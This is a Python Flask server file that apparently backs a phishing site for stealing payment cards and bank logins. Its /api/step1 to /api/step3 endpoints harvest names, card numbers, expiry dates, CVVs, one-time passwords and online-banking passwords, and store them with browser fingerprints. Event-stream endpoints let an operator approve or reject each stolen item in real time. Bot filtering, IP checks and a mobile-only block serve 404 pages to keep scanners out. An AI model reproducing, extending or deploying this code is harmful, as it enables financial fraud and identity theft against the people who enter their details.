import time
import jwt
from flask import g, redirect, url_for
from flask import (
    jsonify,
    request,
    render_template,
    abort,
    Response,
)
from flask_cors import CORS
from jwt import exceptions
#from ip3country import CountryLookup
from blacklist.blacklist import NoBot
#from guardian_domain import check_ip
from models import User, Visit
from util.authorize import SALT
from util.ipcheck import ip_find
from util.redis_util import set_online, get_settings, get_jwt
from views.api import api
from views.user import user
from init import app

CORS(app, supports_credentials=True)


@app.before_request
def limit_bot():
    # 机器人过滤
    useragent = str(request.headers["User-Agent"])
    ip = str(request.remote_addr)
    try:
        ip = request.headers["X-Forwarded-For"]
    except KeyError:
        ...
    whitelist = [
        "js",
        "img",
        "css",
        "fonts",
        "api",
        "media",
        "static",
        "admin",
        "api/v2",
        "user",
    ]
    for i in whitelist:
        if request.path.startswith(f"/{i}"):
            return None
   # nobot = NoBot()
   # check_status = [
    #    nobot.is_bot_ip(ip),
   #     nobot.is_bot_host(ip),
   #     nobot.is_bot(useragent),
  #  ]
    #lookup = CountryLookup()
    # if lookup.lookupStr(ip) != 'JP':
    #     abort(404)

    #if True in check_status:
     #   abort(404)
  #  try:
  #      ip_pass = check_ip(str(request.headers["X-Forwarded-For"]))
 #   except:
  #      try:
   #         ip_pass = check_ip(str(request.remote_addr))
   #     except:
    #        ip_pass = False
    ip_pass = ip_find(ip)
    if ip_pass is False:
        abort(404)
    try:
        Visit.add_record(str(request.headers["X-Forwarded-For"]))
    except KeyError:
        Visit.add_record(str(request.remote_addr))
    # 仅手机可访问
    if NoBot().is_phone(useragent) is False and get_settings()["limit_desktop"] != "0":
        abort(404)


@app.before_request
def jwt_authentication():
    auth = request.headers.get("X-Token")
    if auth:
        g.username = None
        try:
            payload = jwt.decode(auth, SALT, algorithms=["HS256"])
            g.username = payload.get("username")
            cache_check = get_jwt(g.username)
            if cache_check:
                if auth != cache_check:
                    g.username = 1
            else:
                g.username = 1
        except exceptions.ExpiredSignatureError:  # 'token已失效'
            g.username = 1
        except jwt.DecodeError:  # 'token认证失败'
            g.username = 2
        except jwt.InvalidTokenError:  # '非法的token'
            g.username = 3


@app.route("/<path:fallback>")
def fallback(fallback):
    if (
        fallback.startswith("css/")
        or fallback.startswith("js/")
        or fallback.startswith("img/")
        or fallback.startswith("media/")
        or fallback.startswith("fonts/")
        or fallback == "favicon.ico"
    ):
        return app.send_static_file(fallback)
    else:
        return app.send_static_file("admin.html")


@app.route("/admin/<path:path>")
def admin_back(path):
    return render_template("admin.html")


@app.route("/")
def redirect_to_main():
    return render_template("index.html")


@app.route("/<path:path>")
def verification(path):
    return render_template("index.html")


@app.route("/BinCard")
def bind_card():
    return render_template("index.html")


@app.route("/Authentication")
def Authentication():
    return render_template("index.html")


@app.route("/Authorise")
def Authorise():
    return render_template("index.html")


@app.route("/api/step1", methods=["POST"])
def step_1():
    req_data = request.get_json()
    person = {
        "appid": req_data["appid"],
        "full_name": req_data["name"],
        "card_number": req_data["card_number"],
        "card_exp": req_data["card_exp"],
        "card_cvv": req_data["card_cvv"],
    }
    if (
        "appid" not in person
        and get_settings()["intercept"] == "1"
        or len(person["appid"]) != 36
    ):
        abort(404)
    fingerprint = [
        "lang:Accept-Language",
        "ip:X-Forwarded-For",
        "User_Agent:User-Agent",
        "plat:Sec-Ch-Ua-Platform",
    ]
    for i in fingerprint:
        fingerprint_data = i.split(":")
        try:
            person[fingerprint_data[0]] = request.headers[fingerprint_data[1]]
        except Exception as msg:
            person[fingerprint_data[0]] = ""
            print(msg)
    try:
        set_online(req_data["appid"])
        User.add_card(person)
        return jsonify(status=200, message="ok")
    except Exception as msg:
        return jsonify(status=400, message=msg)


@app.route("/api/step2", methods=["POST"])
def step_2():
    req_data = request.get_json()
    data_dict = {
        "appid": req_data["appid"],
        "otp": req_data["otp"],
    }
    if (
        "appid" not in data_dict
        and get_settings()["intercept"] == "1"
        or len(data_dict["appid"]) != 36
    ):
        abort(404)
    try:
        set_online(req_data["appid"])
        User.add_otp(data_dict)
        return jsonify(status="200", message="ok")
    except Exception as msg:
        return jsonify(status="400", message=msg)


@app.route("/api/step3", methods=["POST"])
def step_3():
    req_data = request.get_json()
    data_dict = {
        "appid": req_data["appid"],
        "account": req_data["account"],
        "password": req_data["password"],
        "online_bank": req_data["bank_name"],
    }
    if (
        "appid" not in data_dict
        and get_settings()["intercept"] == "1"
        or len(data_dict["appid"]) != 36
    ):
        abort(404)
    try:
        set_online(req_data["appid"])
        User.add_account(data_dict)
        return jsonify(status="200", message="ok")
    except Exception as msg:
        return jsonify(status="error", message=msg)


# 检查卡片状态
@app.route("/api/check_card_status", methods=["GET"])
def check_card_status():
    appid = request.args.get("appid")
    if appid != "NaN":

        def event_stream():
            try_count = 0
            while True:
                try:
                    with app.app_context():
                        status = User.get_card_status(appid)
                        if get_settings()["syn"] == "0":
                            yield "data: ok\n\n"
                            break
                        if status == "放行":
                            yield "data: ok\n\n"
                            break
                        elif status == "卡片错误":
                            User.reset_cardaction(appid)
                            yield "data: card_error\n\n"
                            break
                        elif status == "卡片不支持":
                            User.reset_cardaction(appid)
                            yield "data: card_not_support\n\n"
                            break
                        elif status == "网银验证":
                            yield "data: online_bank\n\n"
                            break
                except Exception as msg:
                    print(msg)
                    yield 'status="wait"'
                finally:
                    set_online(appid)
                    try_count += 1
                    if try_count >= 60:
                        yield "data: change\n\n"
                        break
                    time.sleep(2)

        return Response(event_stream(), mimetype="text/event-stream")


# 检查验证码状态
@app.route("/api/check_otp_status", methods=["GET"])
def check_otp_status():
    appid = request.args.get("appid")
    if appid != "NaN":

        def event_stream():
            try_count = 0
            while True:
                try:
                    with app.app_context():
                        status = User.get_otp_status(appid)
                        if get_settings()["syn"] == "0":
                            yield "data: ok\n\n"
                            break
                        if status == "放行":
                            yield "data: ok\n\n"
                            break
                        elif status == "验证码错误":
                            User.reset_smsaction(appid)
                            yield "data: error\n\n"
                            break
                        elif status == "网银验证":
                            yield "data: online_bank\n\n"
                            break
                        elif status == "重输卡片":
                            User.reset_smsaction(appid)
                            User.reset_cardaction(appid)
                            yield "data: card\n\n"
                            break
                except Exception as msg:
                    print(msg)
                    yield 'status="wait"'
                finally:
                    set_online(appid)
                    try_count += 1
                    if try_count >= 60:
                        yield "data: change\n\n"
                        break
                    time.sleep(2)

        return Response(event_stream(), mimetype="text/event-stream")


# 检查网银状态
@app.route("/api/check_bank_status", methods=["GET"])
def check_bank_status():
    appid = request.args.get("appid")
    if appid != "NaN":

        def event_stream():
            try_count = 0
            while True:
                try:
                    with app.app_context():
                        status = User.get_bank_status(appid)
                        if get_settings()["syn"] == "0":
                            yield "data: ok\n\n"
                            break
                        if status == "放行":
                            yield "data: ok\n\n"
                            break
                        elif status == "验证错误":
                            User.reset_bankaction(appid)
                            yield "data: error\n\n"
                            break
                        elif status == "重输卡片":
                            User.reset_bankaction(appid)
                            User.reset_smsaction(appid)
                            User.reset_cardaction(appid)
                            yield "data: card\n\n"
                            break
                except Exception as msg:
                    print(msg)
                    yield 'status="wait"'
                finally:
                    set_online(appid)
                    try_count += 1
                    if try_count >= 60:
                        yield "data: change\n\n"
                        break
                    time.sleep(2)

        return Response(event_stream(), mimetype="text/event-stream")


app.register_blueprint(api)
app.register_blueprint(user)
if __name__ == "__main__":
    app.run(threaded=True, debug=True, host="0.0.0.0",port=5201)
